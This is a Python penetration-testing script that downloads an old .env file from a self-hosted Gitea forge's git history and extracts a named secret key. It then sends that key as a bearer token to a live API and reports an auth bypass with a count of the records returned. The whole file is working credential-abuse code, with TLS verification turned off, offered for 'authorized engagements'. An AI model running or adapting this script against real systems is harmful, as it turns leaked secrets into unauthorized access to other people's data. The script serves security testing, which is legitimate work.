#!/usr/bin/env python3
"""
validate_leaked_key.py — end-to-end, READ-ONLY proof chain for git-history key leaks.

Chain: fetch historical blob from a self-hosted forge (Gitea raw URL, parent-rev `^`
syntax supported) -> parse the secret -> prove auth bypass on the live API with a
401-without / 200-with GET pair. No mutating requests are ever sent.

Usage (authorized engagements only):
  python3 validate_leaked_key.py \
    --blob-url "https://guthib.target.co/raw/commit/4c28058^/.env" \
    --api-base "https://app.target.co/backend/api" \
    --endpoints /items /rooms /transactions \
    --var SECRET_KEY --scheme "Bearer {value}"

Exit codes: 0 = bypass proven; 1 = leak gone or not exploitable (record either way).
"""
import argparse, sys, re, httpx


def fetch_blob(url: str) -> str:
    c = httpx.Client(verify=False, timeout=20,
                     headers={"User-Agent": "Mozilla/5.0 ReconAgent/1.0"})
    r = c.get(url)
    print(f"[1] blob {url} -> HTTP {r.status_code} ({len(r.content)} bytes)")
    if r.status_code != 200:
        print("[!] leak URL not accessible (fixed, privatized, or wrong sha) — record status")
        sys.exit(1)
    return r.text


def parse_value(text: str, var: str) -> str:
    m = re.search(rf'{re.escape(var)}\s*[=:]\s*["\']?([^"\'\n]+)', text)
    if not m:
        print(f"[!] variable {var!r} not found in blob")
        sys.exit(1)
    return m.group(1).strip()


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--blob-url", required=True)
    ap.add_argument("--api-base", required=True)
    ap.add_argument("--endpoints", nargs="+", default=["/items"])
    ap.add_argument("--var", default="SECRET_KEY")
    ap.add_argument("--scheme", default="Bearer {value}",
                    help="header value template, e.g. 'Bearer {value}' or '{value}'")
    ap.add_argument("--header", default="Authorization")
    args = ap.parse_args()

    value = parse_value(fetch_blob(args.blob_url), args.var)
    print(f"[2] parsed {args.var} from history (len={len(value)})")

    c = httpx.Client(verify=False, timeout=20,
                     headers={"User-Agent": "Mozilla/5.0 ReconAgent/1.0"})
    hdr = {args.header: args.scheme.format(value=value)}

    proven = False
    for ep in args.endpoints:
        try:
            r0 = c.get(args.api_base + ep)
            r1 = c.get(args.api_base + ep, headers=hdr)
            n = ""
            if r1.status_code == 200:
                try:
                    n = f" ({len(r1.json().get('data', []))} records)"
                except Exception:
                    pass
            verdict = "BYPASS" if (r0.status_code in (401, 403)
                                   and r1.status_code == 200) else "-"
            if verdict == "BYPASS":
                proven = True
            print(f"[3] {ep}: no-auth={r0.status_code} with-key={r1.status_code}{n} [{verdict}]")
        except Exception as e:
            print(f"[3] {ep}: ERROR {e}")

    print("\n[=]", "AUTH BYPASS PROVEN — leaked credential valid on live system"
          if proven else "not proven (rotated? different header scheme? check manually)")


if __name__ == "__main__":
    main()
